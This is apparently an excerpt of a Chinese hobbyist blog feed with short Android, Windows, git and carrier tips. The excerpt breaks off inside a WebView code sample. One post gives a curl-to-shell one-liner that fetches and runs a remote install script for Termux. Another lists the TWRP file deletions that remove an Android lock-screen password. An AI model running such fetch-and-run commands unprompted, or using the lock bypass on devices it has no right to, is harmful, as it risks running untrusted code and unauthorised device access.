        <content type="html"><![CDATA[<div id="txt_view">一个在线文本转语音小工具</div><a id="more"></a><div class="page-reward" style="display: none;" id="qr_view"><font id="local_text"></font></div><center>  <textarea style="width: 95%;max-width: 1024px;" id="text_in" type="text" placeholder="请输入内容" rows="8" autofocus></textarea></center><br><center><button onclick="tts()">文本转语音</button></center><script type="text/javascript">function tts(){    var docId = document.getElementById("text_in");    var text = docId.value;    var link = "https://tts.baidu.com/text2audio?tex="+text+"&cuid=baike&lan=ZH&ctp=1&pdt=301&vol=9&rate=32&per=0";    var mp3 = new Audio(encodeURI(link));    mp3.play();}</script><script>document.getElementById("txt_view").style.display = "none";window.addEventListener('load',function(){if(navigator.userAgent.match(/QQ\//i)) {document.getElementById("text_in").style.display = "none";document.getElementById('qr_view').style.display='block';document.getElementById("local_text").innerHTML = '不支持在QQ内使用，请前往浏览器打开';}})</script><p><a href="/2021/tts-bai-du-api/">API相关说明</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Win10优雅的关闭自动更新</title>
      <link href="/2022/win10-you-ya-de-guan-bi-zi-dong-geng-xin/"/>
      <url>/2022/win10-you-ya-de-guan-bi-zi-dong-geng-xin/</url>
      
        <content type="html"><![CDATA[<p>方法来自epcdiy ：BV1EB4y1V7v1 <a href="https://bilibili.com/video/BV1EB4y1V7v1" target="_blank" rel="noopener">Windows自动更新越做越差？为何微软越来越不希望你关了他？</a>   </p><a id="more"></a>  <p>在开始菜单，输入中文“组策略”打开</p><p>打开计算机配置-管理模板-Windows组件-Windows更新</p><p>找到配置自动更新（Win11还要再打开管理终端用户体验）</p><p>选择选项“已启用”，在下面“配置自动更新”选“2-通知下载和自动安装”</p><p>这样选择后有更新系统会提示更新，需要更新时手动选择下载安装更新即可</p><iframe src="//player.bilibili.com/player.html?aid=602194939&bvid=BV1EB4y1V7v1&cid=810474236&page=1" scrolling="no" border="0" frameborder="no" framespacing="0" allowfullscreen="true"> </iframe>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>git快速提交到仓库</title>
      <link href="/2022/git-kuai-su-ti-jiao-dao-cang-ku/"/>
      <url>/2022/git-kuai-su-ti-jiao-dao-cang-ku/</url>
      
        <content type="html"><![CDATA[<p>创建了个bat脚本用于快速提交git  </p><a id="more"></a>  <p>使用时可以讲<a href="run.bat">run.bat</a>放到本地仓库目录里，双击便可提交到git</p><p>也可以新建文本文档，粘贴下面命令，另存为bat文件，文件编码选择 <code>ANSI</code> </p><figure class="highlight crmsh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">git add .</span><br><span class="line">@echo off</span><br><span class="line">set /p <span class="attr">param=</span>请输入commit：</span><br><span class="line">echo on</span><br><span class="line">git commit -m <span class="string">"%param%"</span></span><br><span class="line">git pull origin <span class="literal">master</span></span><br><span class="line">git push origin <span class="literal">master</span></span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>给Linux用的<a href="run.sh">run.sh</a></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#!/bin/sh</span></span><br><span class="line"><span class="built_in">read</span> -p <span class="string">"Please input commit: "</span> info</span><br><span class="line">git add .</span><br><span class="line">git commit -m <span class="string">"<span class="variable">$&#123;info&#125;</span>"</span></span><br><span class="line">git pull origin master</span><br><span class="line">git push origin master</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> git </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>安卓保留数据降级应用</title>
      <link href="/2022/an-zhuo-bao-liu-shu-ju-jiang-ji-ying-yong/"/>
      <url>/2022/an-zhuo-bao-liu-shu-ju-jiang-ji-ying-yong/</url>
      
        <content type="html"><![CDATA[<p>降级安装命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pm install -d -r /data/local/tmp/xxx.apk</span><br></pre></td></tr></table></figure><a id="more"></a>  <p>其中  <code>-d</code> 表示降级安装， <code>-r</code> 表示保留数据安装现有应用，需要adb shell或root执行命令</p><p>如果安装报错可以尝试将apk文件放到 <code>/data/local/tmp</code> 目录进行安装</p><p>还是无法安装可以尝试保留数据卸载再安装应用</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pm uninstall -k packagename</span><br><span class="line">pm install -d /data/local/tmp/xxx.apk</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓View自定义字体</title>
      <link href="/2022/an-zhuo-view-zi-ding-yi-zi-ti/"/>
      <url>/2022/an-zhuo-view-zi-ding-yi-zi-ti/</url>
      
        <content type="html"><![CDATA[<p>字体ttf放到assets目录，使用自定义View继承自想要设置字体View，代码如下  </p><a id="more"></a>  <figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">LEDClock</span> <span class="keyword">extends</span> <span class="title">TextClock</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">LEDClock</span><span class="params">(Context context, AttributeSet attrs)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>(context,attrs);</span><br><span class="line">        init(context);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">init</span><span class="params">(Context context)</span></span>&#123;</span><br><span class="line">        String file = <span class="string">"DIGITAL-Regular.ttf"</span>;</span><br><span class="line">        AssetManager assetManager = context.getAssets();</span><br><span class="line">        Typeface typeface = Typeface.createFromAsset(assetManager,file);</span><br><span class="line">        setTypeface(typeface);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓预置的一些图标</title>
      <link href="/2022/an-zhuo-yu-zhi-de-yi-xie-tu-biao/"/>
      <url>/2022/an-zhuo-yu-zhi-de-yi-xie-tu-biao/</url>
      
        <content type="html"><![CDATA[<figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">android:</span>icon=<span class="string">"@android:drawable/ic_menu_help"</span></span><br></pre></td></tr></table></figure><p>使用 <code>@android:drawable</code> 时as会提示可选的图标样式</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>小米激活查询</title>
      <link href="/2022/xiao-mi-ji-huo-cha-xun/"/>
      <url>/2022/xiao-mi-ji-huo-cha-xun/</url>
      
        <content type="html"><![CDATA[<p>手机激活时间查询<br><a href="https://chat.kefu.mi.com/page/activation#/" target="_blank" rel="noopener">https://chat.kefu.mi.com/page/activation#/</a>  </p><a id="more"></a>  <p>真伪查询<br><a href="https://m.mi.com/aftersale/security" target="_blank" rel="noopener">https://m.mi.com/aftersale/security</a></p><p>手機註冊延保<br><a href="https://m.buy.mi.com/hk/registration" target="_blank" rel="noopener">https://m.buy.mi.com/hk/registration</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Termux下载</title>
      <link href="/2022/termux-xia-zai/"/>
      <url>/2022/termux-xia-zai/</url>
      
        <content type="html"><![CDATA[<p>换了手机，想重新下载termux是发现网页Fdroid时打不开了，找到了github里的链接，在这里记录下  </p><a id="more"></a>  <p><a href="https://github.com/termux/termux-app/releases/" target="_blank" rel="noopener">Termux-App</a>  </p><p><a href="https://github.com/termux/termux-api/releases" target="_blank" rel="noopener">Termux-Api</a>  </p><p>ohmyzsh终端美化</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh -c <span class="string">"<span class="variable">$(curl -fsSL https://github.com/Cabbagec/termux-ohmyzsh/raw/master/install.sh)</span>"</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>MIUI13使用MikuWeather</title>
      <link href="/2022/miui13-shi-yong-mikuweather/"/>
      <url>/2022/miui13-shi-yong-mikuweather/</url>
      
        <content type="html"><![CDATA[<p><a href="/2021/miku-weather/">MikuWeather小部件获取</a>  </p><a id="more"></a>  <h4 id="为什么MIUI13不能用："><a href="#为什么MIUI13不能用：" class="headerlink" title="为什么MIUI13不能用："></a>为什么MIUI13不能用：</h4><p>在旧版本MIUI中，天气小部件储存在公众储存目录 <code>/storage/emulated/0/MIUI/theme/.data</code> ，MikuWeather程序将小部件文件释放到文件中便能直接使用，在MIUI13中，小部件切换到了应用私有目录 <code>/storage/emulated/0/Android/data/com.android.thememanager/files/MIUI/theme/.data</code> 中，安卓11限制了Android/data目录的访问，普通应用只能使用自己的私有目录，其他应用的私有目录需要使用root访问或想MT管理器那种骚操作访问。</p><h4 id="MIUI13解决方法"><a href="#MIUI13解决方法" class="headerlink" title="MIUI13解决方法"></a>MIUI13解决方法</h4><p>（1）使用MT管理器复制文件使用<br>在MikuWeather里添加小部件后，用MT管理器将</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/storage/</span>emulated<span class="regexp">/0/</span>MIUI<span class="regexp">/theme/</span>.data</span><br></pre></td></tr></table></figure><p>目录的所有文件复制到</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="regexp">/storage/</span>emulated<span class="regexp">/0/</span>Android<span class="regexp">/data/</span>com.android.thememanager<span class="regexp">/files/</span>MIUI<span class="regexp">/theme/</span>.data</span><br></pre></td></tr></table></figure><p>目录就可以正常使用（上边的路径直接直接复制在MT管理器里粘贴访问）  </p><p>（2）直接导入mtz文件使用<br>新版小部件 <a href="https://www.coolapk.com/feed/34811513?shareKey=OWZlOTU3NWZiMzQ5NjI5ZGE5NTc~&shareUid=778415&shareFrom=com.coolapk.market_12.3" target="_blank" rel="noopener">酷安@Andy蛋黄酱</a> 已经拆包制作了mtz文件，旧版mtz可以直接在软件关于里获取</p><p>mtz文件可以在主题壁纸应用 - 我的 - 主题 - 从SD卡导入 导入成功即可使用</p><p>mtz小部件导入即可使用，mikuWeather最早也是以mtz分享的，后来才打包了apk，小部件没有主题验证，不用主题破解</p><p>文件复制/mtz导入后可以在 “支持小部件应用-全部-安卓小部件”入口添加时钟小部件</p><p><img src="/img/preloader.gif" data-original="https://gcore.jsdelivr.net/gh/gddhy/blog-res/other_img/xbj.png" alt="img"></p><p>（图片来自小米开发者文档）</p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Win设置开机启动应用</title>
      <link href="/2022/win-she-zhi-kai-ji-qi-dong-ying-yong/"/>
      <url>/2022/win-she-zhi-kai-ji-qi-dong-ying-yong/</url>
      
        <content type="html"><![CDATA[<p>将快捷方式或应用程序放到目录  </p><figure class="highlight taggerscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:<span class="symbol">\P</span>rogramData<span class="symbol">\M</span>icrosoft<span class="symbol">\W</span>indows<span class="symbol">\S</span>tart Menu<span class="symbol">\P</span>rograms<span class="symbol">\S</span>tartup</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>屏蔽闪信、0级短信</title>
      <link href="/2022/ping-bi-shan-xin-0-ji-duan-xin/"/>
      <url>/2022/ping-bi-shan-xin-0-ji-duan-xin/</url>
      
        <content type="html"><![CDATA[<p>闪信，类原生上提示0级短信，来信息了直接霸屏通知，比较烦，由于不是普通短信，手机骚扰拦截没法直接拦截，只能设置拒绝接接收闪信，下面方法限移动  </p><a id="more"></a>  <p>第一步：<br>编辑短信 <code>USSD</code> 发送到 <code>10658086</code><br>将闪信接收方式改为彩印  </p><p>第二步：<br>编辑短信 <code>JJ</code> 发送到 <code>10658086</code><br>设置拒绝接收所有彩印  </p><p>如果想要接收闪信可以编辑短信 <code>HF</code> 发送到 <code>10658086</code> 恢复接受闪信，再发送 <code>SX</code> 恢复为闪信方式</p><p>不想手动编辑短信，下面可以点击跳转短信直接发送，需要浏览器支持，建议使用chrome或自带浏览器</p><table><thead><tr><th align="center"></th><th align="center">安卓</th><th align="center">iOS</th></tr></thead><tbody><tr><td align="center">更改为彩印</td><td align="center"><a href="sms:10658086?body=USSD" target="_blank" rel="noopener">USSD</a></td><td align="center"><a href="sms:10658086&body=USSD" target="_blank" rel="noopener">USSD</a></td></tr><tr><td align="center">拒绝接收</td><td align="center"><a href="sms:10658086?body=JJ" target="_blank" rel="noopener">JJ</a></td><td align="center"><a href="sms:10658086&body=JJ" target="_blank" rel="noopener">JJ</a></td></tr><tr><td align="center">恢复接收</td><td align="center"><a href="sms:10658086?body=HF" target="_blank" rel="noopener">HF</a></td><td align="center"><a href="sms:10658086&body=HF" target="_blank" rel="noopener">HF</a></td></tr><tr><td align="center">更改为闪信</td><td align="center"><a href="sms:10658086?body=SX" target="_blank" rel="noopener">SX</a></td><td align="center"><a href="sms:10658086&body=SX" target="_blank" rel="noopener">SX</a></td></tr></tbody></table><hr><p>拦截说完了，下面说一下发送闪信，也是限移动  </p><p>如果还留着之前的神州行卡，可以进入神州行天地里发送直显短信，这个就是发送闪信</p><p>如果用着智能机，可以下载移动超级号APP，在这个里面也可以发送闪信</p><p>超级号app下载：<a href="market://details?id=com.cmic.supersim" target="_blank" rel="noopener">应用商店</a> | <a href="https://m.wandoujia.com/apps/8123678" target="_blank" rel="noopener">豌豆荚</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>清除安卓锁屏密码</title>
      <link href="/2022/qing-chu-an-zhuo-suo-ping-mi-ma/"/>
      <url>/2022/qing-chu-an-zhuo-suo-ping-mi-ma/</url>
      
        <content type="html"><![CDATA[<p>需要手机之前解过bootloader锁/手机没有强制加密，不然无法完成下面操作  </p><a id="more"></a>  <p>进入twrp rec删除以下文件</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/<span class="class"><span class="keyword">data</span>/system/locksettings.db</span></span><br><span class="line">/<span class="class"><span class="keyword">data</span>/system/locksettings.db-shm</span></span><br><span class="line">/<span class="class"><span class="keyword">data</span>/system/locksettings.db-wal</span></span><br><span class="line">/<span class="class"><span class="keyword">data</span>/system/gatekeeper.password.key</span></span><br><span class="line">/<span class="class"><span class="keyword">data</span>/system/gatekeeper.pattern.key</span></span><br></pre></td></tr></table></figure><p>下面文件如果有的话一并删除</p><figure class="highlight haskell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/<span class="class"><span class="keyword">data</span>/system/fingerprintpassword.key</span></span><br><span class="line">/<span class="class"><span class="keyword">data</span>/system/personal.key</span></span><br><span class="line">/<span class="class"><span class="keyword">data</span>/system/gesture.key</span></span><br><span class="line">/<span class="class"><span class="keyword">data</span>/system/password.key</span></span><br></pre></td></tr></table></figure><p>上面文件不一定全都有，mokee90只有locksettings.db文件。</p><p>文件来源<a href="https://www.htcp.net/3681.html" target="_blank" rel="noopener">Android 7.0 以上去除锁屏密码的方法 | 云梦</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>移动呼叫转移</title>
      <link href="/2022/yi-dong-hu-jiao-zhuan-yi/"/>
      <url>/2022/yi-dong-hu-jiao-zhuan-yi/</url>
      
        <content type="html"><![CDATA[<p>呼叫转移可以在手机电话无法接通时将号码转移到其他手机的功能，下边是功能的快捷设置方法  </p><a id="more"></a>  <p>部分手机拨号功能中也提供了呼叫转移设置，可以方便使用</p><p><strong>呼叫转移功能谨慎使用</strong></p><h4 id="无条件转移"><a href="#无条件转移" class="headerlink" title="无条件转移"></a>无条件转移</h4><ul><li>开通： <code>**21*要转移到的电话号码#</code> 按呼出键；  </li><li>取消：##21#按呼出键；  </li><li>查询：*#21#按呼出键；</li></ul><h4 id="关机转移"><a href="#关机转移" class="headerlink" title="关机转移"></a>关机转移</h4><ul><li>开通： <code>**62*要转移到的电话号码#</code> 按呼出键；  </li><li>取消：##62#按呼出键；  </li><li>查询：*#62#按呼出键；    </li></ul><h4 id="遇忙转移"><a href="#遇忙转移" class="headerlink" title="遇忙转移"></a>遇忙转移</h4><ul><li>开通： <code>**67*要转移到的电话号码#</code> 按呼出键；  </li><li>取消：##67#按呼出键；  </li><li>查询：*#67#按呼出键；  </li></ul><h4 id="无应答转移"><a href="#无应答转移" class="headerlink" title="无应答转移"></a>无应答转移</h4><ul><li>开通： <code>**61*要转移到的电话号码#</code> 按呼出键；  </li><li>取消：##61#按呼出键；  </li><li>查询：*#61#按呼出键  </li></ul><h4 id="取消所有转移"><a href="#取消所有转移" class="headerlink" title="取消所有转移"></a>取消所有转移</h4><ul><li>按##02#再呼出键</li></ul><p>无条件呼叫转移只能单独使用，其他三个可以同时使用，手机号需要提前开启呼叫转移功能</p><h4 id="呼叫转移快速设置"><a href="#呼叫转移快速设置" class="headerlink" title="呼叫转移快速设置"></a>呼叫转移快速设置</h4><p>点击对应功能后会直接跳转到拨号器界面，再点击拨号按键可以执行对应功能，如若无法跳转，请更换浏览器后重试</p><table><thead><tr><th align="center">无条件转移</th><th align="center"><a onclick="setCall('21')">开通</a></th><th align="center"><a onclick="call('%23%2321%23')">取消</a></th><th align="center"><a onclick="call('*%2321%23')">查询</a></th></tr></thead><tbody><tr><td align="center">关机转移</td><td align="center"><a onclick="setCall('62')">开通</a></td><td align="center"><a onclick="call('%23%2362%23')">取消</a></td><td align="center"><a onclick="call('*%2362%23')">查询</a></td></tr><tr><td align="center">遇忙转移</td><td align="center"><a onclick="setCall('67')">开通</a></td><td align="center"><a onclick="call('%23%2367%23')">取消</a></td><td align="center"><a onclick="call('*%2367%23')">查询</a></td></tr><tr><td align="center">无应答转移</td><td align="center"><a onclick="setCall('61')">开通</a></td><td align="center"><a onclick="call('%23%2361%23')">取消</a></td><td align="center"><a onclick="call('*%2361%23')">查询</a></td></tr></tbody></table><input type="number" id="call_num" placeholder="输入要转移到的号码"><p><button onclick="call('%23%23002%23')">取消所有转移</button></p><script>window.addEventListener('load',function(){if(navigator.userAgent.match(/QQ\//i)) {document.getElementById("call_num").style.display="none";}})function setCall(num){if(document.getElementById("call_num").value != ""){call('**'+num+'*'+document.getElementById("call_num").value+'%23');}else{alert("请先输入要转移到的号码");}}function call(num){/* # 使用%23 */window.location.href="tel:"+num;}</script>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>安卓WebView带进度条快速使用</title>
      <link href="/2021/an-zhuo-webview-dai-jin-du-tiao-kuai-su-shi-yong/"/>
      <url>/2021/an-zhuo-webview-dai-jin-du-tiao-kuai-su-shi-yong/</url>
      
        <content type="html"><![CDATA[<p>快速集成WebView使用  </p><a id="more"></a>  <p>创建res/drawable/progress_style.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">layer-list</span> <span class="attr">xmlns:android</span>=<span class="string">"http://schemas.android.com/apk/res/android"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 总进度的颜色 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">android:id</span>=<span class="string">"@android:id/background"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">shape</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">solid</span> <span class="attr">android:color</span>=<span class="string">"#757575"</span> /&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">shape</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 缓存的颜色 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">android:id</span>=<span class="string">"@android:id/secondaryProgress"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">clip</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">shape</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">solid</span> <span class="attr">android:color</span>=<span class="string">"#C8C8C8"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">shape</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">clip</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">&lt;!-- 当前进度的颜色 --&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">item</span> <span class="attr">android:id</span>=<span class="string">"@android:id/progress"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">clip</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">shape</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">solid</span> <span class="attr">android:color</span>=<span class="string">"#66CCFF"</span> /&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">shape</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">clip</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">item</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">layer-list</span>&gt;</span></span><br></pre></td></tr></table></figure><p>layout中的view</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">FrameLayout</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">    <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span>&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">WebView</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/webView"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:fadingEdge</span>=<span class="string">"none"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:overScrollMode</span>=<span class="string">"never"</span> /&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">ProgressBar</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:id</span>=<span class="string">"@+id/progressBar"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">style</span>=<span class="string">"?android:attr/progressBarStyleHorizontal"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_width</span>=<span class="string">"match_parent"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_height</span>=<span class="string">"8px"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:layout_gravity</span>=<span class="string">"top"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:progressDrawable</span>=<span class="string">"@drawable/progress_style"</span></span></span><br><span class="line"><span class="tag">        <span class="attr">android:visibility</span>=<span class="string">"gone"</span> /&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">FrameLayout</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在AIDE中可以使用</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">style="@android:style/Widget.ProgressBar.Horizontal"</span><br></pre></td></tr></table></figure><p>在Activity中</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">String LINK =<span class="string">""</span>;</span><br><span class="line">WebView webView;</span><br><span class="line">ProgressBar progressBar;</span><br><span class="line"> </span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">(Bundle savedInstanceState)</span></span>&#123;</span><br><span class="line">    ...</span><br><span class="line"></span><br><span class="line">    initView();</span><br><span class="line">    webView.loadUrl(LINK);</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">initView</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    webView = findViewById(R.id.webView);</span><br><span class="line">    progressBar = findViewById(R.id.progressBar);</span><br><span class="line">    </span><br><span class="line">    WebSettings webSettings = webView.getSettings();</span><br><span class="line">    <span class="comment">//如果访问的页面中要与Javascript交互，则webView必须设置支持Javascript</span></span><br><span class="line">    webSettings.setJavaScriptEnabled(<span class="keyword">true</span>);</span><br><span class="line">    <span class="comment">//网页在app内打开</span></span><br><span class="line">    webView.setWebViewClient(<span class="keyword">new</span> WebViewClient() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">shouldOverrideUrlLoading</span><span class="params">(WebView view, String url)</span> </span>&#123;</span><br><span class="line">            view.loadUrl(url);</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">    webView.setWebChromeClient(<span class="keyword">new</span> WebChromeClient() &#123;</span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onProgressChanged</span><span class="params">(WebView view, <span class="keyword">int</span> newProgress)</span> </span>&#123;</span><br><span class="line">            <span class="keyword">if</span> (newProgress == <span class="number">100</span>) &#123;</span><br><span class="line">                progressBar.setVisibility(View.GONE);<span class="comment">//加载完网页进度条消失</span></span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                progressBar.setVisibility(View.VISIBLE);<span class="comment">//开始加载网页时显示进度条</span></span><br><span class="line">                progressBar.setProgress(newProgress);<span class="comment">//设置进度值</span></span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">super</span>.onProgressChanged(view, newProgress);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 